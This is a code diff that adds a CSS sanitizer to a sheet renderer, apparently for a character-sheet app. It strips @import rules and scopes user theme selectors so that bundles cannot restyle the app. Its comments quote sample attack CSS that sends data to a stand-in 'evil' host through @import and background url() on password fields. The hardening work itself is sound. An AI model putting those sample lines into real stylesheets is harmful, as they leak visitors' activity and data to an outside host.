@@ -912,6 +912,132 @@ function sanitizeBundleHtml(html) {
   return DOMPurify.sanitize(html, { ...DOMPURIFY_CONFIG });
 }
 
+// ── DOMPurify equivalent for CSS: theme.css sanitization ──────────────────
+// Bundle hardening #3. theme.css is supplied by the bundle author and injected
+// verbatim into a <style> tag in document.head. Three attacker surfaces:
+//
+//   1. @import url(https://evil/exfil?...): the browser fetches that URL on
+//      every load, leaking IP + timestamp. Bundles never legitimately need
+//      @import — they're self-contained.
+//   2. Selectors that escape .sheet-root: a rule like
+//        .login-button { display: none }   or
+//        input[type="password"] { background: url('https://evil/log?focused') }
+//      restyles app chrome or fingerprints stored data via background-url
+//      fetches that fire on selector match.
+//   3. url() with javascript: or data: schemes — modern browsers reject these,
+//      but old WebKit can be inconsistent.
+//
+// We do two passes:
+//
+//   PASS 1 (text-level): regex-strip @import and @charset before they reach
+//     the parser. Belt-and-suspenders since pass 2 would also drop them, but
+//     pass 2 is async-safe-only and we want zero chance of an @import url()
+//     firing a fetch during parsing.
+//
+//   PASS 2 (CSSOM): create a CSSStyleSheet, replaceSync() the cleaned text,
+//     then walk cssRules. For each style rule, prefix any selector that
+//     isn't already scoped under .sheet-root. Drop @import/@charset
+//     defensively. Recurse into @media/@supports for nested rules.
+//
+// Fail-closed: if anything throws, return an empty string (no theme applied)
+// rather than the un-sanitized original. A broken sheet is recoverable; a
+// bypassed sanitizer isn't.
+function sanitizeBundleCss(rawCss) {
+  if (!rawCss || typeof rawCss !== 'string') return '';
+  try {
+    // Pass 1: strip @import and @charset at the text level. Match common
+    // forms — quoted/unquoted URLs, optional media query lists.
+    const text = rawCss
+      .replace(/@import\s+[^;]+;/gi, '')
+      .replace(/@charset\s+["'][^"']*["']\s*;/gi, '');
+
+    // Pass 2: parse via CSSOM and prefix selectors.
+    // CSSStyleSheet + replaceSync is supported in all modern browsers (Chrome
+    // 73+, Firefox 101+, Safari 16.4+). All currently in our browserslist.
+    const sheet = new CSSStyleSheet();
+    sheet.replaceSync(text);
+
+    const out = [];
+    for (let i = 0; i < sheet.cssRules.length; i++) {
+      const rule = sheet.cssRules[i];
+      const cleaned = cleanCssRule(rule);
+      if (cleaned) out.push(cleaned);
+    }
+    return out.join('\n');
+  } catch (e) {
+    // eslint-disable-next-line no-console
+    console.warn('[SheetRenderer] theme.css failed sanitization — dropping theme', e);
+    return '';
+  }
+}
+
+// Walk one CSSRule and return its sanitized cssText, or '' to drop it.
+// Recurses into grouping rules (@media, @supports) which contain their own
+// cssRules collection.
+function cleanCssRule(rule) {
+  // CSSRule.type is deprecated but still the most portable way to discriminate.
+  // 1 = STYLE_RULE, 3 = IMPORT_RULE, 2 = CHARSET_RULE, 4 = MEDIA_RULE,
+  // 12 = SUPPORTS_RULE. Others (keyframes, font-face, page) we pass through.
+  switch (rule.type) {
+    case 3:  // IMPORT — already stripped in pass 1, defence in depth.
+    case 2:  // CHARSET — same.
+      return '';
+
+    case 1: {  // STYLE_RULE
+      // selectorText is a comma-separated list. Prefix each selector that
+      // doesn't already start under .sheet-root. This forces the rule to
+      // only match inside the sheet, no matter what the author wrote.
+      const selectors = rule.selectorText.split(',').map(s => prefixSelector(s.trim()));
+      // Rebuild cssText: "selector1, selector2 { decls }" — use rule.style.cssText
+      // for the declarations to keep browser-canonical formatting and drop any
+      // unparseable noise.
+      return `${selectors.join(', ')} { ${rule.style.cssText} }`;
+    }
+
+    case 4:    // MEDIA_RULE
+    case 12: { // SUPPORTS_RULE
+      // Grouping rules contain nested rules — recurse.
+      const inner = [];
+      for (let j = 0; j < rule.cssRules.length; j++) {
+        const c = cleanCssRule(rule.cssRules[j]);
+        if (c) inner.push(c);
+      }
+      if (!inner.length) return '';
+      // rule.conditionText gives the "(max-width: 600px)" part for both
+      // @media and @supports in modern browsers.
+      const at = rule.type === 4 ? '@media' : '@supports';
+      const cond = rule.conditionText || rule.media?.mediaText || '';
+      return `${at} ${cond} { ${inner.join(' ')} }`;
+    }
+
+    default:
+      // @keyframes, @font-face, @page, @namespace — no selectors targeting
+      // app chrome, so pass through as-is. Use cssText (the browser's
+      // serialised form).
+      return rule.cssText || '';
+  }
+}
+
+// Prefix a single selector so it only matches inside .sheet-root.
+// Already-scoped selectors are returned unchanged.
+function prefixSelector(sel) {
+  const trimmed = sel.trim();
+  if (!trimmed) return '';
+  // Already scoped (starts with .sheet-root, or is exactly .sheet-root).
+  if (trimmed === '.sheet-root' || /^\.sheet-root[\s>+~,]|^\.sheet-root$/.test(trimmed)) {
+    return trimmed;
+  }
+  // :root → .sheet-root (so CSS variables declared at :root only apply inside
+  // the sheet, not globally on the app).
+  if (/^:root\b/.test(trimmed)) {
+    return trimmed.replace(/^:root\b/, '.sheet-root');
+  }
+  // Everything else: descendant of .sheet-root.
+  // "body" → ".sheet-root body" (which won't match anything — good, that's
+  // the intent: a bundle can't restyle <body>).
+  return `.sheet-root ${trimmed}`;
+}
+
 // ── buildProps ──────────────────────────────────────────────────────────────
 // Translate a node's raw attribute bag into React props for the chosen tag.
 //
@@ -1459,11 +1585,15 @@ export default function SheetRenderer({ char, update, charId, readOnly = false, 
         // Absolute /api/sheets/<id>/assets/... paths still work too.
         const assetBase = `/api/sheets/${sheetId}/assets`;
 
-        // Inject CSS
+        // Sanitize and inject CSS. sanitizeBundleCss strips @import / @charset
+        // (closes the off-origin exfiltration vector) and prefixes every
+        // selector with .sheet-root so a bundle's theme can't restyle the app's
+        // own chrome (login, admin, share UI). %ASSETS% resolution happens
+        // BEFORE sanitization so url() values see the final paths.
         if (styleRef.current) styleRef.current.remove();
         const style = document.createElement('style');
         style.setAttribute('data-sheet-theme', sheetId);
-        style.textContent = css.split('%ASSETS%').join(assetBase);
+        style.textContent = sanitizeBundleCss(css.split('%ASSETS%').join(assetBase));
         document.head.appendChild(style);
         styleRef.current = style;
 
